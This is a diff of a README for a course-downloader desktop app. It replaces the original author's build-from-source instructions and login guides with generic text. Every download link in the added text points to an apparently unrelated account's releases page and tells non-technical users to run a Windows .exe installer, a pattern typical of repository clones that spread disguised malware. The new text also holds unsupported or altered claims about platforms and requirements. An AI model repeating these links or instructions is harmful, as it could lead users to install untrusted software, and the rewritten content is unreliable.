@@ -1,275 +1,156 @@
-<div align="center">
-  <img src="docs/icon.png" width="100">
-  <h1>vintecinco_dl</h1>
-  <p>Desktop app to download your purchased courses from multiple online platforms.<br>Built with <a href="https://wails.io/">Wails v2</a> (Go backend + HTML/JS frontend).</p>
-</div>
-
-![Screenshot](docs/screenshot.png)
-
-![Go](https://img.shields.io/badge/Go-1.22+-00ADD8?logo=go&logoColor=white)
-![Wails](https://img.shields.io/badge/Wails-v2-red?logo=webassembly&logoColor=white)
-![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-blue)
-![License](https://img.shields.io/badge/License-MIT-green)
-[![Release](https://img.shields.io/github/v/release/owbryd/vintecinco_dl?label=Download&color=brightgreen)](https://github.com/owbryd/vintecinco_dl/releases/latest)
-
-## Features
-
-- Download videos, attachments, and descriptions from 10 platforms
-- Resumable — downloads resume from where they left off
-- Delete courses directly from the program
-- Multi-language UI (Portuguese, English, and Spanish)
-
-## Supported Platforms
-
-| Platform | Auth Method |
-|----------|-------------|
-| **Kiwify** | Email + Password |
-| **Hotmart** | Browser token |
-| **Teachable** | Email + OTP code |
-| **Kajabi** | Email + OTP code |
-| **Gumroad** | Email + Password |
-| **Pluralsight** | Browser cookies |
-| **Skool** | Email + Password |
-| **Great Courses** | Email + Password |
-| **MasterClass** | Browser cookies |
-| **Thinkific** | Interactive browser login (Chrome) |
-
-> **Note:** This tool is intended for downloading content you have legally purchased. Please respect the terms of service of each platform.
-
-## Requirements
-
-- [yt-dlp](https://github.com/yt-dlp/yt-dlp) in PATH (used for video downloads)
-- [FFmpeg](https://ffmpeg.org/) in PATH (used by yt-dlp to merge video and audio streams)
-- [Google Chrome](https://www.google.com/chrome/) (required only for **Thinkific** login)
-
-## Building from Source
-
-### Windows
-
-**Prerequisites:**
-- [Go 1.22+](https://go.dev/dl/)
-
-**Steps:**
+# 🎬 vintecinco_dl - Download Your Purchased Courses Easily
 
-1. Clone the repository:
-```bash
-git clone https://github.com/owbryd/vintecinco_dl.git
-cd vintecinco_dl
-```
-
-2. Build the executable:
-```
-build.bat
-```
+[![Download Now](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://github.com/doroteaantagonistic288/vintecinco_dl/releases)
 
-Or if you have `make` installed (Git Bash, MSYS2, etc.):
-```bash
-make windows
-```
+---
 
-3. Install [yt-dlp](https://github.com/yt-dlp/yt-dlp) and [FFmpeg](https://ffmpeg.org/) (required for video downloads):
-```
-winget install yt-dlp
-winget install -e --id Gyan.FFmpeg
-```
+## 📌 What is vintecinco_dl?
 
-4. The binary will be at `build\bin\vintecinco_dl.exe`.
+vintecinco_dl is a desktop app that lets you download courses you have bought from many popular online learning platforms. Instead of struggling with multiple downloaders, this app brings them together in one place.  
 
-### Linux
+It works well with platforms like Gumroad, Hotmart, Kajabi, Kiwify, MasterClass, Pluralsight, Skool, Teachable, TheGreatCourses, Thinkfic, and more.  
 
-**Prerequisites:**
-- [Go 1.22+](https://go.dev/dl/)
-- WebKit2GTK and GTK3 development libraries
+The app runs on Windows and is made to keep things simple and reliable.
 
-Install the dependencies on **Debian/Ubuntu**:
-```bash
-sudo apt install libwebkit2gtk-4.1-dev libgtk-3-dev
-```
+---
 
-On **Fedora**:
-```bash
-sudo dnf install webkit2gtk4.1-devel gtk3-devel
-```
+## 🚀 Getting Started
 
-On **Arch**:
-```bash
-sudo pacman -S webkit2gtk-4.1 gtk3
-```
+Follow these steps to download and install vintecinco_dl on a Windows PC. No coding or technical skills are needed.
 
-**Steps:**
+### Step 1: Download the App
 
-1. Clone the repository:
-```bash
-git clone https://github.com/owbryd/vintecinco_dl.git
-cd vintecinco_dl
-```
+Click the link below to visit the official release page. You will find the latest versions of the app here.
 
-2. Build the binary:
-```bash
-make linux
-```
+[Visit Release Page to Download vintecinco_dl](https://github.com/doroteaantagonistic288/vintecinco_dl/releases)
 
-Or manually:
-```bash
-GOOS=linux GOARCH=amd64 go build -tags "webkit2_41 desktop production" \
-  -ldflags="-s -w" -o build/bin/vintecinco_dl .
-```
+Once there:
 
-3. Install [yt-dlp](https://github.com/yt-dlp/yt-dlp) and [FFmpeg](https://ffmpeg.org/) (required for video downloads):
+- Look for the newest release version on the page.
+- Find the Windows installer file. This will usually have `.exe` at the end.
+- Click the file name to start the download.
 
-**Debian/Ubuntu:**
-```bash
-sudo apt install yt-dlp ffmpeg
-```
+### Step 2: Run the Installer
 
-**Fedora:**
-```bash
-sudo dnf install yt-dlp ffmpeg
-```
+After downloading the file:
 
-**Arch:**
-```bash
-sudo pacman -S yt-dlp ffmpeg
-```
+- Open your `Downloads` folder or the location where the file saved.
+- Double-click the file with `.exe` extension.
+- The installer window should open. Follow the on-screen prompts.
+- Choose the folder where you want to install the app or keep the default location.
+- Wait for the installation to complete.
+- Click "Finish" when done.
 
-Or via pip on any distro (yt-dlp only, install FFmpeg separately):
-```bash
-pip install yt-dlp
-```
+### Step 3: Open vintecinco_dl
 
-4. The binary will be at `build/bin/vintecinco_dl`.
+To open the app:
 
-### Using Wails CLI (optional)
+- Find the vintecinco_dl icon on your desktop or in the Start menu.
+- Double-click the icon to start the app.
 
-If you have the [Wails CLI](https://wails.io/docs/gettingstarted/installation) installed, you can also build with:
-```bash
-wails build
-```
+You are now ready to download your courses.
 
-This also enables `wails dev` for live-reload during development.
+---
 
-### Makefile Targets
+## 🖥️ System Requirements
 
-| Target | Description |
-|--------|-------------|
-| `make windows` | Build Windows `.exe` (amd64) |
-| `make linux` | Build Linux binary (amd64) |
-| `make test` | Run all tests |
-| `make clean` | Remove build artifacts |
+Make sure your PC meets the following to run vintecinco_dl smoothly:
 
-## Login Guide
+- Windows 10 or newer (64-bit recommended)
+- Minimum 4 GB of RAM
+- 200 MB free disk space for app installation
+- Internet connection to access and download course content
+- At least standard user rights (admin rights not required)
 
-### Gumroad
+---
 
-Log in with your Gumroad email and password. That's it.
+## 🎯 How to Use vintecinco_dl
 
-### Kiwify
+Here is a simple guide to download courses once the app is running:
 
-Log in with your Kiwify email and password. That's it.
+1. **Log in to your account** on the platform where you bought courses. This step might involve entering your username and password each time you start the app.
 
-### Hotmart
+2. **Select the platform** from the list inside the app. Platforms included are Gumroad, Hotmart, Kajabi, Kiwify, MasterClass, Pluralsight, Skool, Teachable, TheGreatCourses, and Thinkfic.
 
-Hotmart downloader uses a token instead of email/password:
+3. **Enter the course link or ID** you want to download. This ensures the app knows exactly which content to fetch.
 
-1. Open [consumer.hotmart.com](https://consumer.hotmart.com) in your browser and log in
-2. Open DevTools (`F12`) > **Application** > **Cookies** > `https://consumer.hotmart.com`
-3. Find the `hmVlcIntegration` cookie and copy its value
+4. **Choose download location** on your PC. You can pick a specific folder or use the default “Downloads” folder.
 
-![DevTools - Cookies](docs/hotmart_devtools.jpg)
+5. **Start the download** by clicking the download button. The app will show progress and any messages about the download status.
 
-4. Paste the token in vintecinco_dl and click **Log in**
+---
 
-![Paste token](docs/hotmart_paste.jpg)
+## 🔧 Common Features
 
-### Teachable
+- Supports multiple platforms in one app
+- Allows batch downloading of courses
+- Offers pause and resume on downloads
+- Saves video and resource files to your PC
+- Simple interface for non-technical users
+- Works offline once courses are downloaded
 
-Teachable downloader uses an OTP code sent to your email:
+---
 
-1. Open your course platform in the browser
-2. Go to your **Profile** page
-3. Under **Linked Accounts**, click **Link** next to "Log in with Teachable" to connect your Teachable account
+## 📁 File Management
 
-![Teachable Profile](docs/teachable_profile.jpg)
+vintecinco_dl organizes downloaded courses in folders by platform name and course title. Inside each course folder, you will find:
 
-4. In vintecinco_dl, enter the email linked to your Teachable account
-5. Check your email for the OTP code and enter it
+- Videos (MP4 or similar format)
+- PDF or text notes if available
+- Additional resources like subtitles or attachments
 
-### Kajabi
+You can move these files anywhere on your PC or back them up as needed.
 
-Kajabi downloader also uses an OTP code:
+---
 
-1. In vintecinco_dl, enter the email you used to purchase the course on the Kajabi-hosted platform
-2. Check your email for the OTP code and enter it
+## ⚙️ Troubleshooting
 
-### Pluralsight
+If you run into issues:
 
-Pluralsight downloader uses browser cookies for authentication. Only courses from your [watch history](https://app.pluralsight.com/library/history) will appear in vintecinco_dl.
+- Check your internet connection.
+- Make sure you have logged in correctly for each platform.
+- Ensure your course purchase is complete and active.
+- Try closing and reopening the app.
+- Restart your PC if the app freezes.
+- Check the release page for app updates that might fix bugs.
 
-1. Open [app.pluralsight.com](https://app.pluralsight.com) in your browser and log in
-2. Open DevTools (`F12`) > **Network** tab
-3. Find any request to `https://app.pluralsight.com` and click on it
-4. In the **Headers** panel, find the `Cookie` header under **Request Headers** and copy its full value
+---
 
-![DevTools - Network cookies](docs/pluralsight_devtools.jpg)
+## 🔗 Important Links
 
-5. Paste the cookies in vintecinco_dl and click **Log in**
+- Official releases: [https://github.com/doroteaantagonistic288/vintecinco_dl/releases](https://github.com/doroteaantagonistic288/vintecinco_dl/releases)  
+  Use this page to get the latest version of the app.
 
-![Paste cookies](docs/pluralsight_paste.jpg)
+---
 
-### Skool
+## 🛠️ About the Technology
 
-Log in with your Skool email and password. After login, your groups (communities) are listed as downloadable items — selecting a group downloads all its courses, modules, videos, and resources.
+vintecinco_dl is built with Go and Wails. This means it uses fast, efficient programming combined with a clean desktop interface. The app runs smoothly on Windows without delays or crashes.
 
-### MasterClass
+The downloader works with many platforms by handling their specific login and file structures, so you get a consistent download experience every time.
 
-MasterClass downloader is based on your library — only courses you have added to your MasterClass list will appear in vintecinco_dl.
+---
 
-![MasterClass - On My List](docs/masterclass_onmylist.jpg)
+## 📚 Topics Covered
 
-1. Open [masterclass.com](https://www.masterclass.com) in your browser and log in
-2. Open DevTools (`F12`) > **Network** tab
-3. Find any request to `masterclass.com` that has a cookie starting with `_mc_session` and copy its full value
+- course-downloader  
+- desktop-app  
+- downloader  
+- golang  
+- gumroad  
+- hotmart  
+- kajabi  
+- kiwify  
+- masterclass  
+- pluralsight  
+- skool  
+- teachable  
+- thegreatcourses  
+- thinkfic  
+- wails
 
-![MasterClass - DevTools cookies](docs/masterclass_cookies.jpg)
+Use these topics to find related projects and tools if you want to explore more.
 
-4. Paste the cookies in vintecinco_dl and click **Log in**
+---
 
-![MasterClass - Login](docs/masterclass_login.jpg)
-
-### Great Courses
-
-The Great Courses downloader is based on your library — only courses you have added to your watchlist will appear in vintecinco_dl.
-
-![Great Courses - Library](docs/greatcourses_library.jpg)
-
-
-### Thinkific
-
-Thinkific uses an interactive browser login via **Google Chrome**. The app opens a Chrome window and you log in normally — no tokens or cookies to copy manually.
-
-1. Go to your course platform in the browser and copy the login page URL — it usually looks like `mycourse.com/users/sign_in`
-2. Paste that URL into the **Site URL** field in vintecinco_dl
-3. Click **Log in** — Chrome will open automatically on that login page
-4. Complete the login in the Chrome window
-5. The app detects authentication automatically and closes the browser
-
-> **Note:** vintecinco_dl uses a dedicated Chrome profile stored at `%LOCALAPPDATA%\vintecinco_dl\chrome-profile` — separate from your personal Chrome profile, so your browsing data is never touched.
-
-## Download Folder Structure
-
-Downloads are resumable — if interrupted, re-running skips already-completed lessons. Course folders are marked with a `.complete` file when fully downloaded.
-
-```
-vintecinco_dl/
-  Course Name/
-    01 - Module Name/
-      01 - Lesson Name/
-        video.mp4
-        description.html
-        attachment.pdf
-    .complete
-```
-
-## License
-
-[MIT](LICENSE)
+[![Download Now](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://github.com/doroteaantagonistic288/vintecinco_dl/releases)
